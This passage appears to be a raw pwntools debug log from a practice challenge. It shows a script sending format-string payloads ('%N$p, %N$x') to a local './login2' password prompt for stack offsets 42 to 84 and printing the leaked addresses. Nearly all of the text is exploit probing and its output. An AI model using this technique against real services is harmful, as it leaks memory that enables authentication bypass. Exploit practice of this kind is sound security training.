+42 : b"AAAABBBB 0x1, 1\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996094
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %43$p, %43$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996094)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xfff15004, fff15004\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+43 : b"AAAABBBB 0xfff15004, fff15004\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996095
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %44$p, %44$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffa36dac, ffa36dac\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[*] Process './login2' stopped with exit code 0 (pid 996095)
+[+] Receiving all data: Done (97B)
+44 : b"AAAABBBB 0xffa36dac, ffa36dac\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996096
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %45$p, %45$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996096)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffbbf670, ffbbf670\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+45 : b"AAAABBBB 0xffbbf670, ffbbf670\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996097
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %46$p, %46$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996097)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7f8de14, f7f8de14\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+46 : b"AAAABBBB 0xf7f8de14, f7f8de14\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996098
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %47$p, %47$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996098)
+[DEBUG] Received 0x5f bytes:
+    b'AAAABBBB 0x80490ed, 80490ed\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 95B
+[+] Receiving all data: Done (95B)
+47 : b"AAAABBBB 0x80490ed, 80490ed\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996099
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %48$p, %48$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996099)
+[DEBUG] Received 0x53 bytes:
+    b'AAAABBBB 0x1, 1\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 83B
+[+] Receiving all data: Done (83B)
+48 : b"AAAABBBB 0x1, 1\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996100
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %49$p, %49$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996100)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffbb1394, ffbb1394\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+49 : b"AAAABBBB 0xffbb1394, ffbb1394\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996101
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %50$p, %50$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996101)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7efce14, f7efce14\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+50 : b"AAAABBBB 0xf7efce14, f7efce14\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996102
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %51$p, %51$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996102)
+[DEBUG] Received 0x5f bytes:
+    b'AAAABBBB 0x804befc, 804befc\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 95B
+[+] Receiving all data: Done (95B)
+51 : b"AAAABBBB 0x804befc, 804befc\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996103
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %52$p, %52$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996103)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7f8fb60, f7f8fb60\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+52 : b"AAAABBBB 0xf7f8fb60, f7f8fb60\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996104
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %53$p, %53$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996104)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+53 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996105
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %54$p, %54$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996105)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0x70aecaf0, 70aecaf0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+54 : b"AAAABBBB 0x70aecaf0, 70aecaf0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996107
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %55$p, %55$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xfa5d8b14, fa5d8b14\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[*] Process './login2' stopped with exit code 0 (pid 996107)
+[+] Receiving all data: Done (97B)
+55 : b"AAAABBBB 0xfa5d8b14, fa5d8b14\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996108
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %56$p, %56$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996108)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+56 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996115
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %57$p, %57$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996115)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+57 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996121
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %58$p, %58$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996121)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+58 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996122
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %59$p, %59$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996122)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7f72b60, f7f72b60\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+59 : b"AAAABBBB 0xf7f72b60, f7f72b60\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996123
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %60$p, %60$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996123)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+60 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996124
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %61$p, %61$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996124)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0x502f7800, 502f7800\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+61 : b"AAAABBBB 0x502f7800, 502f7800\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996125
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %62$p, %62$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996125)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7f09a60, f7f09a60\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+62 : b"AAAABBBB 0xf7f09a60, f7f09a60\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996126
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %63$p, %63$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996126)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7d04c56, f7d04c56\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+63 : b"AAAABBBB 0xf7d04c56, f7d04c56\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996127
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %64$p, %64$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996127)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7f79e14, f7f79e14\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+64 : b"AAAABBBB 0xf7f79e14, f7f79e14\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996128
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %65$p, %65$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996128)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7c8dd88, f7c8dd88\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+65 : b"AAAABBBB 0xf7c8dd88, f7c8dd88\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996129
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %66$p, %66$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996129)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7ee0ac4, f7ee0ac4\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+66 : b"AAAABBBB 0xf7ee0ac4, f7ee0ac4\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996130
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %67$p, %67$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996130)
+[DEBUG] Received 0x5f bytes:
+    b'AAAABBBB 0x804befc, 804befc\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 95B
+[+] Receiving all data: Done (95B)
+67 : b"AAAABBBB 0x804befc, 804befc\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996131
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %68$p, %68$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996131)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+68 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996132
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %69$p, %69$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996132)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7fe5000, f7fe5000\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+69 : b"AAAABBBB 0xf7fe5000, f7fe5000\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996133
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %70$p, %70$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996133)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+70 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996134
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %71$p, %71$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996134)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7fcd2f0, f7fcd2f0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+71 : b"AAAABBBB 0xf7fcd2f0, f7fcd2f0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996135
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %72$p, %72$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996135)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7c97d09, f7c97d09\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+72 : b"AAAABBBB 0xf7c97d09, f7c97d09\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996136
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %73$p, %73$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996136)
+[DEBUG] Received 0x5f bytes:
+    b'AAAABBBB 0x804bff4, 804bff4\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 95B
+[+] Receiving all data: Done (95B)
+73 : b"AAAABBBB 0x804bff4, 804bff4\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996137
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %74$p, %74$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996137)
+[DEBUG] Received 0x53 bytes:
+    b'AAAABBBB 0x1, 1\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 83B
+[+] Receiving all data: Done (83B)
+74 : b"AAAABBBB 0x1, 1\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996138
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %75$p, %75$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996138)
+[DEBUG] Received 0x5f bytes:
+    b'AAAABBBB 0x80490c0, 80490c0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 95B
+[+] Receiving all data: Done (95B)
+75 : b"AAAABBBB 0x80490c0, 80490c0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996139
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %76$p, %76$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996139)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+76 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996140
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %77$p, %77$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996140)
+[DEBUG] Received 0x5f bytes:
+    b'AAAABBBB 0x80490e8, 80490e8\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 95B
+[+] Receiving all data: Done (95B)
+77 : b"AAAABBBB 0x80490e8, 80490e8\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996141
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %78$p, %78$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[DEBUG] Received 0x5f bytes:
+    b'AAAABBBB 0x80490ed, 80490ed\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 95B
+[*] Process './login2' stopped with exit code 0 (pid 996141)
+[+] Receiving all data: Done (95B)
+78 : b"AAAABBBB 0x80490ed, 80490ed\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996142
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %79$p, %79$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996142)
+[DEBUG] Received 0x53 bytes:
+    b'AAAABBBB 0x1, 1\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 83B
+[+] Receiving all data: Done (83B)
+79 : b"AAAABBBB 0x1, 1\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996143
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %80$p, %80$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996143)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xff98e274, ff98e274\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+80 : b"AAAABBBB 0xff98e274, ff98e274\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996144
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %81$p, %81$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996144)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+81 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996145
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %82$p, %82$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996145)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+82 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996146
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %83$p, %83$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996146)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7f09cc0, f7f09cc0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+83 : b"AAAABBBB 0xf7f09cc0, f7f09cc0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996147
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %84$p, %84$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996147)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xff924f4c, ff924f4c\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+84 : b"AAAABBBB 0xff924f4c, ff924f4c\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996148
